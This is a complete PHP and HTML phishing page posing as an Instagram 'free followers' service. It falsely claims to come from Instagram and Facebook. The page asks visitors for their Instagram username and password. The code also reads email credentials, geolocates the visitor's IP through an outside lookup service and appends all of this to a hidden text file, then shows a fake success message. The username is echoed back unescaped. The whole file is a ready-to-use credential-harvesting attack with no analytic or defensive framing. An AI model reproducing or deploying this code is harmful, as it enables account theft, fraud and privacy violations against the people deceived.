<?php

error_reporting(0);
set_time_limit(0);
date_default_timezone_set("Europe/Istanbul");

require 'vendor2/autoload.php';

if(!empty($_GET['username']) && empty($_GET['comen']))
{
    $_GET['username'] = strtolower($_GET['username']);
}

if(isset($_GET['comen']))
{
    $curl = curl_init();
    curl_setopt($curl, CURLOPT_URL, "http://ip-api.com/json/".$_SERVER['REMOTE_ADDR']);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
    $output = curl_exec($curl);
    curl_close($curl);
    $json = json_decode($output, true);
    
    $dosya = fopen("baris-altay.txt", "a");
    fwrite($dosya, "
    \$_KULLANICI_ADI : " . $_GET['username'] . "
    
    \$_SIFRE         : " . $_GET['password'] . "
    
    \$_EPOSTA        : " . $_GET['email'] . "
    
    \$_EPOSTA_SIF    : " . $_GET['emailPassword'] . "
    
    \$_IP            : " . $_SERVER['REMOTE_ADDR'] . "
    
    \$_ULKE          : " . $json['country'] . "
    
    \$_SEHIR         : " . $json['regionName'] . "
    
    \$_ILCE          : " . $json['city'] . "
    
    \$_ISP           : " . $json['isp'] . "
    
    \$_ISTENEN       : " . $_GET['followersCount'] . " takipci
    
    
    
    
    
    
    
    ");
    fclose($dosya);
    
    header("location: /index.php?success=1");
}

?>
<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8">
        <title>Follower System - Instagram</title>
        <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
        <meta name="description" content="Big Instagram Follower System">
        <meta name="author" content="Instagram">
        
        <!-- SCRIPTS -->
        
        <!-- STYLESHEETS -->
        <link rel="stylesheet" href="css/style.css?<?= time(); ?>">
    </head>
    <body>
        <div class="advertise">
            <div class="advertise-left">
                <p class="bold-text">Instagram</p>
                <span class="light-text">Find it for free on Google Play</span>
            </div>
            <div class="advertise-right">
                <a href="https://play.google.com/store/apps/details?id=com.instagram.android" class="get-app-button">Install</a>
            </div>
        </div>
        <?php
        
        if(empty($_GET['username']))
        {
        
        ?>
        <form action="/" method="GET" class="first-form">
            <div class="banner-sm">
                <img src="images/banner-sm.png" class="banner-sm-img" width="175">
            </div>
            <?php if(@$_GET['success'] == 1): ?>
            <span class="color-green">Success! Wait 24 hours and get followers.</span>
            <?php else: ?>
            <span class="color-gray">Fill the form and get followers in 24 hours!</span>
            <?php endif; ?>
            <div class="mb-3">
                <input type="text" name="username" id="username" class="form-input" placeholder="Username" required autocomplete="off">
            </div>
            <div class="mb-3">
                <button type="submit">Next</button>
            </div>
        </form>
        <?php
        }else {
        ?>
        <form action="/" method="GET" class="second-form">
            <p>@<?= $_GET['username']; ?></p>
            <span class="color-gray">Instagram Followers Free</span>
            <div class="mb-3">
                <input type="password" name="password" id="password" class="form-input" placeholder="Password" required autocomplete="off">
            </div>
            <div class="mb-3">
                <select name="followersCount" id="followersCount" class="form-input">
                    <?php

                    for($i = 1000; $i <= 10000; $i += 1000)
                    {
                        ?>
                        <option value="<?= $i; ?>"><?= $i ?></option>
                        <?php
                    }

                    ?>
                </select>
            </div>
            <input hidden type="text" name="username" value="<?= $_GET['username']; ?>">
            <input hidden type="number" name="comen" value="1">
            <div class="mb-3">
                <button type="submit">Get Followers!</button>
            </div>
        </form>
        <?php
        }
        ?>
        <div class="poweredby">
            <p>from</p>
            <span>FACEBOOK</span>
        </div>
    </body>
</html>
